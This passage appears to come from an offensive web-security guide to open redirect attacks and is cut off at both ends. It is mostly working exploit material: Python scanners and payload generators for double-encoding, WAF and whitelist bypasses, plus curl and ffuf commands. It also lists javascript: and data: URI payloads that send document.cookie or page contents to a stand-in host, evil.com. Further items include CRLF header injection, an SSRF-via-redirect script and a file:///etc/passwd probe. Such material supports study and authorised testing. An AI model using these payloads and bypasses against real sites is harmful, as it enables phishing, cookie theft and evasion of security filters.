		    if encode_these[i]: 
			    variant = variant.replace(char, urllib.parse.quote(char)) 
			    if variant != payload: 
				    variants.append((f'selective_{encode_these}', variant))

return variants

def test_double_encoding(target_url, param_name, evil_domain): """Test all encoding variants against target"""

payload = f"https://{evil_domain}"
variants = generate_encoding_variants(payload)

print(f"[*] Testing {len(variants)} encoding variants")
print(f"[*] Target: {target_url}")
print(f"[*] Parameter: {param_name}")
print(f"[*] Evil domain: {evil_domain}\n")

vulnerable = []

for variant_name, encoded_payload in variants:
    test_url = f"{target_url}?{param_name}={encoded_payload}"
    
    try:
        resp = requests.get(test_url, allow_redirects=False, timeout=5)
        
        # Check Location header
        if 'Location' in resp.headers:
            location = resp.headers['Location']
            if evil_domain in location:
                print(f"[+] VULNERABLE: {variant_name}")
                print(f"    Payload: {encoded_payload[:80]}...")
                print(f"    Redirects to: {location}\n")
                vulnerable.append((variant_name, encoded_payload))
        
        # Check for JavaScript/Meta redirects
        elif resp.status_code == 200:
            content = resp.text.lower()
            if evil_domain in content and ('window.location' in content or 'meta' in content):
                print(f"[?] POTENTIAL: {variant_name}")
                print(f"    Contains {evil_domain} in HTML redirect\n")
                
    except Exception as e:
        pass  # Silently continue on errors

print(f"\n[*] Summary: {len(vulnerable)} confirmed vulnerabilities found")
return vulnerable

if __name__ == "__main__": 
	import sys 
	if len(sys.argv) != 4:
		print(f"Usage: {sys.argv[0]} <target_url> <param_name> <evil_domain>") 
		print(f"Example: {sys.argv[0]} http://target.com/redirect url evil.com") 
		sys.exit(1)

test_double_encoding(sys.argv[1], sys.argv[2], sys.argv[3])
````

**Burp Suite extension approach:**

```python
# Burp extension pseudocode for double encoding testing
from burp import IBurpExtender, IScannerCheck
import urllib

class BurpExtender(IBurpExtender, IScannerCheck):
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # Get original value
        original = insertionPoint.getBaseValue()
        
        # Generate encoded payloads
        payloads = [
            "https://burpcollaborator.net",
            urllib.quote("https://burpcollaborator.net", safe=''),
            urllib.quote(urllib.quote("https://burpcollaborator.net", safe=''), safe=''),
        ]
        
        for payload in payloads:
            # Test each payload
            check = insertionPoint.buildRequest(payload)
            response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), check)
            
            # Analyze response for redirect
            if self.isVulnerable(response):
                return [CustomScanIssue(...)]
````

### Bypass Real-World Filters

**Common WAF/filter patterns and bypasses:**

```bash
# Pattern: Block "://" (protocol separator)
# Bypass: Double encode
https%253A%252F%252Fevil.com

# Pattern: Block "http" string
# Bypass: Mixed encoding
h%74%74p://evil.com  # 't' encoded
%68ttp://evil.com    # 'h' encoded
htt%70://evil.com    # 'p' encoded

# Pattern: Block dots in domain
# Bypass: Encode dots
https://evil%2Ecom
https://evil%252Ecom  # Double encoded

# Pattern: Block common TLDs (.com, .net, .org)
# Bypass: Use IP address or encode TLD
https://evil%2Ecom
https://evil.c%6Fm  # 'o' encoded
https://192.168.1.1

# Pattern: Regex blocking external domains
# Bypass: Case manipulation + encoding
HTTPS://evil.com
HtTpS://evil.com
https%3a//evil.com  # Lowercase encoded
HTTPS%3A//evil.com  # Uppercase encoded
```

**Testing WAF detection thresholds:**

```python
#!/usr/bin/env python3
import requests
import urllib.parse
import time

def progressive_encoding_test(url, param, payload):
    """
    Progressively encode more characters until WAF is bypassed
    """
    
    results = []
    
    # Test increasing encoding depths
    for depth in range(1, 5):  # Up to 4 levels of encoding
        encoded = payload
        for _ in range(depth):
            encoded = urllib.parse.quote(encoded, safe='')
        
        test_url = f"{url}?{param}={encoded}"
        print(f"[*] Testing encoding depth {depth}")
        
        try:
            resp = requests.get(test_url, allow_redirects=False, timeout=5)
            
            # Check if WAF blocked (common patterns)
            waf_indicators = ['blocked', 'forbidden', 'security', 'firewall']
            is_blocked = any(indicator in resp.text.lower() for indicator in waf_indicators)
            
            if not is_blocked and resp.status_code in [301, 302, 303, 307, 308]:
                print(f"[+] Bypass found at depth {depth}!")
                print(f"    Status: {resp.status_code}")
                if 'Location' in resp.headers:
                    print(f"    Location: {resp.headers['Location']}")
                results.append((depth, encoded, resp))
            elif is_blocked:
                print(f"[-] WAF blocked at depth {depth}")
            else:
                print(f"[~] No redirect at depth {depth}")
                
            time.sleep(0.5)  # Rate limiting
            
        except Exception as e:
            print(f"[!] Error at depth {depth}: {e}")
    
    return results

# Usage
progressive_encoding_test(
    "http://target.com/redirect",
    "url",
    "https://evil.com"
)
```

### Advanced Double Encoding Scenarios

**Encoding across multiple parameters:**

```bash
# If application concatenates parameters
http://target.com/redirect?scheme=https%253A&domain=%252F%252Fevil.com

# After processing:
# scheme = https: (after double decode)
# domain = //evil.com (after double decode)
# Final: https://evil.com
```

**JSON parameter encoding:**

```json
POST /api/redirect HTTP/1.1
Content-Type: application/json

{
  "redirect_url": "https%253A%252F%252Fevil.com"
}
```

```python
#!/usr/bin/env python3
import requests
import json
import urllib.parse

# Test JSON with encoded values
payload = urllib.parse.quote(urllib.parse.quote("https://evil.com", safe=''), safe='')

data = {
    "redirect_url": payload
}

resp = requests.post(
    "http://target.com/api/redirect",
    json=data,
    allow_redirects=False
)

print(f"Status: {resp.status_code}")
print(f"Location: {resp.headers.get('Location', 'N/A')}")
```

**XML parameter encoding:**

```xml
POST /redirect HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<redirect>
    <url>https%253A%252F%252Fevil.com</url>
</redirect>
```

**Base64 + URL encoding combination:**

```python
#!/usr/bin/env python3
import base64
import urllib.parse

payload = "https://evil.com"

# Base64 encode
b64 = base64.b64encode(payload.encode()).decode()
print(f"Base64: {b64}")

# Then URL encode the Base64
url_encoded = urllib.parse.quote(b64, safe='')
print(f"Base64 + URL encoded: {url_encoded}")

# Double URL encode the Base64
double_encoded = urllib.parse.quote(url_encoded, safe='')
print(f"Base64 + Double URL encoded: {double_encoded}")

# Test payload
test_url = f"http://target.com/redirect?url={double_encoded}"
```

### Decoding Chain Analysis

**Identifying decode operations:**

```python
#!/usr/bin/env python3
import urllib.parse

def analyze_decode_chain(input_string, max_iterations=5):
    """
    Decode input multiple times to see transformation chain
    """
    
    print(f"[*] Analyzing decode chain for: {input_string}\n")
    
    current = input_string
    iteration = 0
    
    while iteration < max_iterations:
        try:
            decoded = urllib.parse.unquote(current)
            
            if decoded == current:
                print(f"[*] Decoding stabilized after {iteration} iterations")
                print(f"    Final value: {decoded}")
                break
            
            print(f"Iteration {iteration}:")
            print(f"  Input:  {current}")
            print(f"  Output: {decoded}")
            
            current = decoded
            iteration += 1
            
        except Exception as e:
            print(f"[!] Error at iteration {iteration}: {e}")
            break
    
    if iteration >= max_iterations:
        print(f"\n[!] Reached maximum iterations ({max_iterations})")
    
    return current

# Test with various encoded payloads
test_cases = [
    "https%253A%252F%252Fevil.com",
    "https%25253A%25252F%25252Fevil.com",
    "%252F%252Fevil.com",
]

for test in test_cases:
    print("\n" + "="*60)
    analyze_decode_chain(test)
```

**Reverse engineering decode logic:**

```python
#!/usr/bin/env python3
import requests
import urllib.parse

def probe_decode_behavior(target_url, param):
    """
    Send progressively encoded inputs to determine decode behavior
    """
    
    # Start with a unique marker
    marker = "MARKER123"
    
    test_cases = [
        (f"{marker}", "none"),
        (urllib.parse.quote(marker), "single"),
        (urllib.parse.quote(urllib.parse.quote(marker)), "double"),
        (urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(marker))), "triple"),
    ]
    
    print("[*] Probing decode behavior...\n")
    
    for encoded, level in test_cases:
        url = f"{target_url}?{param}={encoded}"
        
        try:
            resp = requests.get(url, allow_redirects=False, timeout=5)
            
            # Check where marker appears in response
            if marker in resp.text:
                print(f"[+] {level} encoding: Marker appears in response")
                print(f"    Server decoded to: {marker}")
            elif encoded in resp.text:
                print(f"[~] {level} encoding: Encoded value appears in response")
                print(f"    Server did not decode")
            else:
                print(f"[-] {level} encoding: Marker not found")
                
        except Exception as e:
            print(f"[!] Error testing {level}: {e}")
    
    return

# Usage
probe_decode_behavior("http://target.com/redirect", "url")
```

### Practical CTF Exploitation Examples

**Scenario 1: Double-encoded OAuth redirect_uri:**

```bash
# OAuth endpoint with whitelist
https://target.com/oauth/authorize?redirect_uri=https://target.com/callback

# Double encode to bypass
https://target.com/oauth/authorize?redirect_uri=https%253A%252F%252Ftarget.com%252540evil.com%252Fcallback

# First decode: https%3A%2F%2Ftarget.com%2540evil.com%2Fcallback
# Validation sees: target.com in string (passes)
# Second decode: https://target.com%40evil.com/callback
# Browser resolves: https://evil.com/callback (username portion ignored)
```

**Scenario 2: Header injection via double encoding:**

```bash
# Inject CRLF with double encoding
curl -i "http://target.com/redirect?url=https://target.com%250d%250aLocation:%2520https://evil.com"

# Response after double decode:
HTTP/1.1 302 Found
Location: https://target.com
Location: https://evil.com

# Some browsers follow the second Location header
```

**Scenario 3: File path manipulation:**

```bash
# Download endpoint with path traversal protection
http://target.com/download?file=report.pdf&redirect=/thanks

# Double encode path traversal
http://target.com/download?file=report.pdf&redirect=%252e%252e%252f%252e%252e%252fhttps://evil.com

# First decode: ..%2f..%2fhttps://evil.com
# Validation: Doesn't match ../.. pattern (passes)
# Second decode: ../../https://evil.com
# Application redirects to traversed path
```

**Scenario 4: WAF bypass for SSRF via redirect:**

```python
#!/usr/bin/env python3
import requests
import urllib.parse

# Target internal service via open redirect
internal_target = "http://localhost:8080/admin"

# Single encode (blocked by WAF)
encoded_once = urllib.parse.quote(internal_target, safe='')

# Double encode (bypasses WAF)
encoded_twice = urllib.parse.quote(encoded_once, safe='')

# Make request through open redirect
resp = requests.get(
    f"http://target.com/redirect?url={encoded_twice}",
    allow_redirects=True  # Follow to internal service
)

print(f"Status: {resp.status_code}")
print(f"Response contains 'admin'?: {'admin' in resp.text.lower()}")
```

### Defense Evasion Checklist

```python
#!/usr/bin/env python3
# Comprehensive encoding bypass checklist

def generate_bypass_payloads(evil_domain):
    """Generate comprehensive list of encoding bypass attempts"""
    
    payloads = []
    base_url = f"https://{evil_domain}"
    
    # 1. URL encoding variations
    payloads.append(("Single encode", urllib.parse.quote(base_url, safe='')))
    payloads.append(("Double encode", urllib.parse.quote(urllib.parse.quote(base_url, safe=''), safe='')))
    payloads.append(("Triple encode", urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(base_url, safe=''), safe=''), safe='')))
    
    # 2. Selective encoding
    payloads.append(("Encode colon", base_url.replace(':', '%3A')))
    payloads.append(("Double encode colon", base_url.replace(':', '%253A')))
    payloads.append(("Encode slash", base_url.replace('/', '%2F')))
    payloads.append(("Double encode slash", base_url.replace('/', '%252F')))
    payloads.append(("Encode dot", base_url.replace('.', '%2E')))
    payloads.append(("Double encode dot", base_url.replace('.', '%252E')))
    
    # 3. Mixed encoding
    payloads.append(("Mixed 1", f"https%3A//{evil_domain}"))
    payloads.append(("Mixed 2", f"https:%2F%2F{evil_domain}"))
    payloads.append(("Mixed 3", f"https%253A//{evil_domain}"))
    
    # 4. Case manipulation + encoding
    payloads.append(("Uppercase + encode", f"HTTPS%253A%252F%252F{evil_domain}"))
    payloads.append(("Mixed case + encode", f"HtTpS%253A%252F%252F{evil_domain}"))
    
    # 5. Unicode/special encoding
    payloads.append(("Unicode escape", f"\\u0068\\u0074\\u0074\\u0070\\u0073://{evil_domain}"))
    
    # 6. NULL byte variations
    payloads.append(("Double NULL", f"{base_url}%2500"))
    
    return payloads

import urllib.parse

# Generate and display all payloads
for name, payload in generate_bypass_payloads("evil.com"):
    print(f"{name:25s}: {payload}")
```

### Encoding Detection Tools

**Using custom decoder:**

```bash
#!/bin/bash
# Decode URL multiple times until stable

decode_until_stable() {
    input="$1"
    max_iterations=10
    
    for i in $(seq 1 $max_iterations); do
        decoded=$(python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.argv[1]))" "$input")
        
        echo "Iteration $i: $decoded"
        
        if [ "$decoded" = "$input" ]; then
            echo "Stable after $i iterations"
            break
        fi
        
        input="$decoded"
    done
}

# Usage
decode_until_stable "https%253A%252F%252Fevil.com"
```

**Using CyberChef for analysis:**

```
URL: https://gchq.github.io/CyberChef/

Recipe:
1. From URL decode (repeat multiple times)
2. Analyze patterns
3. Identify encoding depth
```

---

## Core Concepts

Open redirect vulnerabilities occur when applications accept user-controlled input to determine redirect destinations without proper validation. Attackers exploit this to redirect victims from legitimate domains to malicious sites, enabling phishing, credential theft, and malware distribution.

**Vulnerability Pattern:**

```
User clicks: https://trusted-site.com/redirect?url=attacker.com
Application redirects to: https://attacker.com
Victim trusts redirect due to legitimate domain in initial URL
```

**Common Vulnerable Parameters:**

```
?url=
?redirect=
?next=
?return=
?returnTo=
?redirect_uri=
?continue=
?dest=
?destination=
?redir=
?redirect_url=
?return_path=
?callback=
?go=
?target=
```

## Detection and Enumeration

### Manual Testing Methodology

**Basic Detection:**

```bash
# Test common redirect parameters
curl -I "https://target.com/redirect?url=https://evil.com"
curl -I "https://target.com/login?next=https://evil.com"
curl -I "https://target.com/logout?return=https://evil.com"

# Check HTTP response codes
# 301/302: Redirect present
# 200: May use meta refresh or JavaScript

# Examine Location header
curl -I "https://target.com/redirect?url=https://evil.com" | grep -i location
```

**Testing with Burp Suite:**

```
1. Enable Proxy → Intercept
2. Browse application looking for redirect functionality
3. Send redirect requests to Repeater (Ctrl+R)
4. Modify redirect parameter values
5. Analyze responses:
   - Location header destination
   - Meta refresh tags
   - JavaScript window.location changes
```

### Automated Scanning

**Using `ffuf` for Parameter Fuzzing:**

```bash
# Discover redirect parameters
ffuf -u "https://target.com/FUZZ?url=https://evil.com" \
  -w /usr/share/wordlists/burp-parameter-names.txt \
  -mc 301,302,303,307,308 \
  -o redirect_params.json

# Test known endpoints with redirect wordlist
ffuf -u "https://target.com/login?FUZZ=https://evil.com" \
  -w redirect_params.txt \
  -mc 301,302 \
  -fs 0

# Multiple parameter positions
ffuf -u "https://target.com/oauth/callback?redirect_uri=FUZZ" \
  -w payloads.txt \
  -mc all \
  -fw 0
```

**Custom Python Scanner:**

```python
import requests
from urllib.parse import urlencode, urlparse

def test_open_redirect(base_url, params, test_url="https://evil.com"):
    """Test for open redirect vulnerability"""
    
    vulnerable = []
    
    for param in params:
        test_params = {param: test_url}
        full_url = f"{base_url}?{urlencode(test_params)}"
        
        try:
            response = requests.get(
                full_url,
                allow_redirects=False,
                timeout=5
            )
            
            # Check Location header
            if 'Location' in response.headers:
                location = response.headers['Location']
                parsed = urlparse(location)
                
                # Check if redirects to our test URL
                if test_url in location or 'evil.com' in parsed.netloc:
                    vulnerable.append({
                        'url': full_url,
                        'parameter': param,
                        'redirect_to': location,
                        'method': 'Location header'
                    })
                    print(f"[!] VULNERABLE: {param} → {location}")
            
            # Check meta refresh
            if b'http-equiv="refresh"' in response.content.lower():
                if test_url.encode() in response.content:
                    vulnerable.append({
                        'url': full_url,
                        'parameter': param,
                        'method': 'Meta refresh'
                    })
                    print(f"[!] VULNERABLE (meta): {param}")
            
            # Check JavaScript redirects
            js_patterns = [b'window.location', b'document.location', b'location.href']
            for pattern in js_patterns:
                if pattern in response.content.lower() and test_url.encode() in response.content:
                    vulnerable.append({
                        'url': full_url,
                        'parameter': param,
                        'method': 'JavaScript redirect'
                    })
                    print(f"[!] VULNERABLE (JS): {param}")
                    break
        
        except requests.RequestException as e:
            print(f"[-] Error testing {param}: {e}")
    
    return vulnerable

# Usage
base_url = "https://target.com/redirect"
params = ['url', 'redirect', 'next', 'return', 'redirect_uri', 'continue']

results = test_open_redirect(base_url, params)
print(f"\n[*] Found {len(results)} vulnerable parameters")
```

### Parameter Discovery

**Wordlist for Redirect Parameters:**

```bash
# Create comprehensive parameter list
cat > redirect_params.txt << 'EOF'
url
redirect
next
return
returnTo
redirect_uri
continue
dest
destination
redir
redirect_url
return_path
callback
go
target
to
goto
exit
out
view
forward
link
site
html
oauth_callback
success_url
failure_url
checkout_url
EOF

# Test all parameters
while read param; do
    echo "[*] Testing: $param"
    curl -s -I "https://target.com/login?${param}=https://evil.com" | \
      grep -i "^location:" | grep -i "evil.com" && \
      echo "[!] VULNERABLE: $param"
done < redirect_params.txt
```

## Bypass Techniques

### URL Encoding and Obfuscation

**Basic Encoding Bypasses:**

```bash
# URL encoding
?url=https%3A%2F%2Fevil.com

# Double encoding
?url=https%253A%252F%252Fevil.com

# Unicode encoding
?url=https\u003a\u002f\u002fevil.com

# Mixed encoding
?url=https%3A//evil.com
?url=https:%2F%2Fevil.com

# Hex encoding
?url=https://\x65\x76\x69\x6c.com

# Using @ symbol (URL authority bypass)
?url=https://trusted.com@evil.com
?url=https://trusted.com:evil.com@evil.com
```

**Python Script for Encoding Variations:**

```python
from urllib.parse import quote, quote_plus

def generate_bypass_payloads(malicious_url):
    """Generate various encoded bypass attempts"""
    
    payloads = []
    
    # Standard URL encoding
    payloads.append(quote(malicious_url))
    
    # Double encoding
    payloads.append(quote(quote(malicious_url)))
    
    # Triple encoding
    payloads.append(quote(quote(quote(malicious_url))))
    
    # Mixed case protocol
    payloads.append(malicious_url.replace('https://', 'HtTpS://'))
    payloads.append(malicious_url.replace('https://', 'HTTPS://'))
    
    # Backslash instead of forward slash
    payloads.append(malicious_url.replace('/', '\\'))
    
    # Unicode encoding
    unicode_payload = ""
    for char in malicious_url:
        unicode_payload += f"\\u{ord(char):04x}"
    payloads.append(unicode_payload)
    
    # Remove protocol
    payloads.append(malicious_url.replace('https://', '//'))
    payloads.append(malicious_url.replace('https://', ''))
    
    return payloads

malicious = "https://evil.com/phishing"
for payload in generate_bypass_payloads(malicious):
    print(payload)
```

### Whitelist Bypass Techniques

**Domain Whitelisting Bypasses:**

```bash
# Subdomain bypass
?url=https://evil.com.trusted.com  # If checking ends with trusted.com
?url=https://trusted.com.evil.com  # Subdomain of attacker domain

# Path bypass
?url=https://trusted.com/../../evil.com
?url=https://trusted.com/../evil.com

# Username in URL
?url=https://trusted.com@evil.com
?url=https://trusted.com:password@evil.com

# Fragment bypass
?url=https://trusted.com#@evil.com

# Query parameter bypass
?url=https://trusted.com?@evil.com

# Null byte injection (older systems)
?url=https://trusted.com%00.evil.com
?url=https://trusted.com%00@evil.com

# Using decimal/octal/hex IP representation
?url=https://2130706433  # 127.0.0.1 in decimal
?url=https://0x7f.0x0.0x0.0x1  # 127.0.0.1 in hex

# Using alternative ports
?url=https://trusted.com:80@evil.com:443
```

**Advanced Whitelist Bypass:**

```python
import requests
from urllib.parse import urlparse

def test_whitelist_bypass(target_url, whitelisted_domain):
    """Generate and test whitelist bypass payloads"""
    
    bypass_templates = [
        f"https://evil.com.{whitelisted_domain}",
        f"https://{whitelisted_domain}.evil.com",
        f"https://{whitelisted_domain}@evil.com",
        f"https://{whitelisted_domain}:pass@evil.com",
        f"https://{whitelisted_domain}#@evil.com",
        f"https://{whitelisted_domain}?@evil.com",
        f"https://{whitelisted_domain}%00.evil.com",
        f"https://{whitelisted_domain}%2F%2Fevil.com",
        f"https://{whitelisted_domain}/../evil.com",
        f"https://{whitelisted_domain}/..%2Fevil.com",
        f"https://evil.com/{whitelisted_domain}",
        f"https://evil.com%2F{whitelisted_domain}",
        f"https://evil.com?{whitelisted_domain}",
        f"https://{whitelisted_domain}%2523@evil.com",  # Encoded #
    ]
    
    for payload in bypass_templates:
        try:
            response = requests.get(
                target_url,
                params={'url': payload},
                allow_redirects=False,
                timeout=5
            )
            
            if 'Location' in response.headers:
                location = response.headers['Location']
                parsed = urlparse(location)
                
                if 'evil.com' in parsed.netloc:
                    print(f"[!] BYPASS SUCCESS: {payload}")
                    print(f"    Redirects to: {location}")
                    return True
        
        except Exception as e:
            continue
    
    return False

test_whitelist_bypass(
    "https://target.com/redirect",
    "trusted-domain.com"
)
```

### Path Traversal in Redirects

**Directory Traversal Payloads:**

```bash
# Basic traversal
?url=../evil.com
?url=../../evil.com
?url=./../evil.com

# Encoded traversal
?url=..%2Fevil.com
?url=..%252Fevil.com
?url=%2e%2e%2fevil.com

# Mixed encoding
?url=..%5Cevil.com
?url=..%5c%5cevil.com

# Absolute path bypass
?url=/../../evil.com
?url=///evil.com

# Combining with domain
?url=//trusted.com/../evil.com
?url=https://trusted.com/../../evil.com
```

### Case Sensitivity Bypasses

**Case Variation Testing:**

```bash
# Protocol variations
?url=HTtps://evil.com
?url=HTTPS://evil.com
?url=hTTpS://evil.com

# Domain variations (DNS typically case-insensitive)
?url=https://EVIL.COM
?url=https://Evil.Com
?url=https://eViL.cOm

# Path variations (depends on server)
?url=https://trusted.com/REDIRECT
?url=https://trusted.com/Redirect
```

## Protocol-Based Bypasses

### JavaScript Protocol Exploitation

**Basic JavaScript Protocol:**

```bash
# Direct JavaScript execution
?url=javascript:alert(document.domain)
?url=javascript:alert('XSS')
?url=javascript:window.location='https://evil.com'

# URL encoded
?url=javascript%3Aalert(1)
?url=%6a%61%76%61%73%63%72%69%70%74%3aalert(1)

# Mixed encoding
?url=javas%63ript:alert(1)
?url=java%0ascript:alert(1)
?url=java%0dscript:alert(1)

# Case variation
?url=JavaScript:alert(1)
?url=JAVASCRIPT:alert(1)
?url=JaVaScRiPt:alert(1)
```

**Advanced JavaScript Payloads:**

```javascript
// Redirect to attacker domain
javascript:window.location='https://evil.com/phishing?cookie='+document.cookie

// Form submission to attacker
javascript:document.forms[0].action='https://evil.com/steal';document.forms[0].submit()

// Fetch API exfiltration
javascript:fetch('https://evil.com/log?data='+btoa(document.body.innerHTML))

// XHR-based stealing
javascript:x=new XMLHttpRequest();x.open('POST','https://evil.com/steal');x.send(document.cookie)

// Service worker registration
javascript:navigator.serviceWorker.register('https://evil.com/sw.js')
```

**Filter Bypass Techniques:**

```bash
# Null byte injection
?url=javascript%00:alert(1)

# Newline characters
?url=java%0ascript:alert(1)
?url=java%0dscript:alert(1)
?url=java%0d%0ascript:alert(1)

# Tab character
?url=java%09script:alert(1)

# Nested encoding
?url=javas%2563ript:alert(1)  # %25 = %, so %2563 becomes %63 = 'c'

# HTML entities (if processed)
?url=javascript&#58alert(1)
?url=javascript&#x3a;alert(1)

# Unicode characters
?url=\u006aavascript:alert(1)  # \u006a = 'j'
```

**Testing JavaScript Protocol:**

```python
import requests
from urllib.parse import quote

def test_javascript_protocol(target_url, param='url'):
    """Test JavaScript protocol bypass attempts"""
    
    payloads = [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:window.location='https://evil.com'",
        "javascript%3Aalert(1)",
        "%6a%61%76%61%73%63%72%69%70%74%3aalert(1)",
        "javas%63ript:alert(1)",
        "java%0ascript:alert(1)",
        "java%0dscript:alert(1)",
        "JavaScript:alert(1)",
        "javascript%00:alert(1)",
        "java%09script:alert(1)",
        "jav&#x0A;ascript:alert(1)",
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
    ]
    
    vulnerable = []
    
    for payload in payloads:
        try:
            response = requests.get(
                target_url,
                params={param: payload},
                allow_redirects=False,
                timeout=5
            )
            
            # Check if JavaScript protocol is reflected
            if b'javascript:' in response.content.lower():
                print(f"[!] JavaScript protocol reflected: {payload}")
                vulnerable.append(payload)
            
            # Check Location header
            if 'Location' in response.headers:
                if 'javascript:' in response.headers['Location'].lower():
                    print(f"[!] VULNERABLE (Location): {payload}")
                    vulnerable.append(payload)
        
        except Exception as e:
            continue
    
    return vulnerable

test_javascript_protocol("https://target.com/redirect")
```

### Data URI Exploitation

**Basic Data URI Payloads:**

```bash
# HTML with redirect
?url=data:text/html,<script>location='https://evil.com'</script>

# HTML with meta refresh
?url=data:text/html,<meta http-equiv="refresh" content="0;url=https://evil.com">

# Base64 encoded HTML
?url=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=

# JavaScript execution
?url=data:text/html,<script>alert(document.domain)</script>

# Form auto-submit
?url=data:text/html,<form action="https://evil.com" method="POST" id="f"><input name="data" value="stolen"></form><script>document.getElementById('f').submit()</script>
```

**Advanced Data URI Techniques:**

```python
import base64

def generate_data_uri_payloads(redirect_target):
    """Generate data URI bypass payloads"""
    
    payloads = []
    
    # Simple JavaScript redirect
    js_redirect = f"<script>location='{redirect_target}'</script>"
    payloads.append(f"data:text/html,{js_redirect}")
    
    # Base64 encoded redirect
    b64_redirect = base64.b64encode(js_redirect.encode()).decode()
    payloads.append(f"data:text/html;base64,{b64_redirect}")
    
    # Meta refresh
    meta_refresh = f'<meta http-equiv="refresh" content="0;url={redirect_target}">'
    payloads.append(f"data:text/html,{meta_refresh}")
    
    # iframe injection
    iframe = f'<iframe src="{redirect_target}" width="100%" height="100%"></iframe>'
    payloads.append(f"data:text/html,{iframe}")
    
    # Form auto-submit to steal data
    form_html = f'''
    <form action="{redirect_target}" method="POST" id="exfil">
        <input type="hidden" name="stolen_cookie" value="" id="cookie_field">
    </form>
    <script>
        document.getElementById('cookie_field').value = document.cookie;
        document.getElementById('exfil').submit();
    </script>
    '''
    b64_form = base64.b64encode(form_html.encode()).decode()
    payloads.append(f"data:text/html;base64,{b64_form}")
    
    return payloads

# Generate payloads
for payload in generate_data_uri_payloads("https://evil.com/steal"):
    print(payload)
    print()
```

**Data URI with MIME Type Variations:**

```bash
# Text/HTML
?url=data:text/html,<script>alert(1)</script>

# Text/Plain (may still execute in some contexts)
?url=data:text/plain,<script>alert(1)</script>

# Application/JavaScript
?url=data:application/javascript,alert(1)

# Image with onerror
?url=data:image/svg+xml,<svg onload=alert(1)>

# With charset
?url=data:text/html;charset=utf-8,<script>alert(1)</script>

# URL encoded data URI
?url=data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### VBScript and Other Protocols

**VBScript Protocol (Internet Explorer):**

```bash
# Basic VBScript
?url=vbscript:MsgBox(1)
?url=vbscript:Execute("MsgBox(1)")

# Redirect using VBScript
?url=vbscript:CreateObject("WScript.Shell").Run("https://evil.com")

# [Inference] VBScript protocol primarily affects older IE versions
# Modern browsers do not support this protocol
```

**Alternative Protocol Bypasses:**

```bash
# File protocol (local file access)
?url=file:///etc/passwd
?url=file:///C:/Windows/System.ini

# FTP protocol
?url=ftp://evil.com/malware.exe

# Gopher protocol (SSRF potential)
?url=gopher://internal-server:1234/_POST%20/admin

# Chrome extension protocol
?url=chrome-extension://[extension-id]/page.html

# About protocol
?url=about:blank
?url=about:srcdoc

# Blob protocol (with existing blob)
?url=blob:https://target.com/[uuid]
```

## Meta Refresh Exploitation

### HTML Meta Refresh Tag

**Basic Meta Refresh:**

```html
<!-- Immediate redirect -->
<meta http-equiv="refresh" content="0;url=https://evil.com">

<!-- Delayed redirect (5 seconds) -->
<meta http-equiv="refresh" content="5;url=https://evil.com">

<!-- With message -->
<meta http-equiv="refresh" content="3;url=https://evil.com">
<p>Redirecting in 3 seconds...</p>
```

**Detection in Responses:**

```bash
# Search for meta refresh in response
curl -s "https://target.com/redirect?url=https://evil.com" | \
  grep -i 'meta.*refresh'

# Extract redirect URL from meta tag
curl -s "https://target.com/redirect?url=https://evil.com" | \
  grep -oP '(?<=url=)[^"]+' | head -1
```

**Testing Meta Refresh Vulnerability:**

```python
import requests
import re

def test_meta_refresh(target_url, param, test_domain="evil.com"):
    """Test for meta refresh open redirect"""
    
    test_url = f"https://{test_domain}"
    response = requests.get(
        target_url,
        params={param: test_url},
        timeout=5
    )
    
    # Search for meta refresh tag
    meta_pattern = re.compile(
        rb'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+>',
        re.IGNORECASE
    )
    
    meta_tags = meta_pattern.findall(response.content)
    
    for tag in meta_tags:
        if test_domain.encode() in tag:
            print(f"[!] Meta refresh vulnerability found:")
            print(f"    Tag: {tag.decode(errors='ignore')}")
            
            # Extract redirect URL
            url_match = re.search(rb'url=([^"\'>]+)', tag, re.IGNORECASE)
            if url_match:
                redirect_url = url_match.group(1).decode(errors='ignore')
                print(f"    Redirects to: {redirect_url}")
            
            return True
    
    return False

test_meta_refresh("https://target.com/redirect", "next")
```

### Meta Refresh Bypass Techniques

**Injection Bypasses:**

```html
<!-- Attribute injection -->
<meta http-equiv="refresh" content="0;url=https://trusted.com" malicious="https://evil.com">

<!-- JavaScript in URL -->
<meta http-equiv="refresh" content="0;url=javascript:location='https://evil.com'">

<!-- Data URI in meta refresh -->
<meta http-equiv="refresh" content="0;url=data:text/html,<script>location='https://evil.com'</script>">

<!-- Encoded URL -->
<meta http-equiv="refresh" content="0;url=https%3A%2F%2Fevil.com">
```

**Testing Encoded Meta Refresh:**

```python
from urllib.parse import quote

def generate_meta_refresh_bypasses(target_domain):
    """Generate meta refresh bypass payloads"""
    
    payloads = []
    
    # Standard
    payloads.append(f"https://{target_domain}")
    
    # URL encoded
    payloads.append(quote(f"https://{target_domain}"))
    
    # Double encoded
    payloads.append(quote(quote(f"https://{target_domain}")))
    
    # JavaScript protocol in meta
    payloads.append(f"javascript:location='https://{target_domain}'")
    
    # Data URI
    payloads.append(f"data:text/html,<script>location='https://{target_domain}'</script>")
    
    # With fragment
    payloads.append(f"https://trusted.com#https://{target_domain}")
    
    # Null byte
    payloads.append(f"https://trusted.com%00.{target_domain}")
    
    return payloads

for payload in generate_meta_refresh_bypasses("evil.com"):
    print(f"Testing: {payload}")
```

## JavaScript-Based Redirects

### Common JavaScript Redirect Patterns

**Location Property Manipulation:**

```javascript
// window.location assignment
window.location = 'https://evil.com';
window.location.href = 'https://evil.com';

// location without window
location = 'https://evil.com';
location.href = 'https://evil.com';

// document.location
document.location = 'https://evil.com';
document.location.href = 'https://evil.com';

// location.assign()
location.assign('https://evil.com');
window.location.assign('https://evil.com');

// location.replace() - no browser history
location.replace('https://evil.com');
window.location.replace('https://evil.com');
```

**Detection Patterns:**

```bash
# Search for JavaScript redirects in response
curl -s "https://target.com/redirect?url=https://evil.com" | \
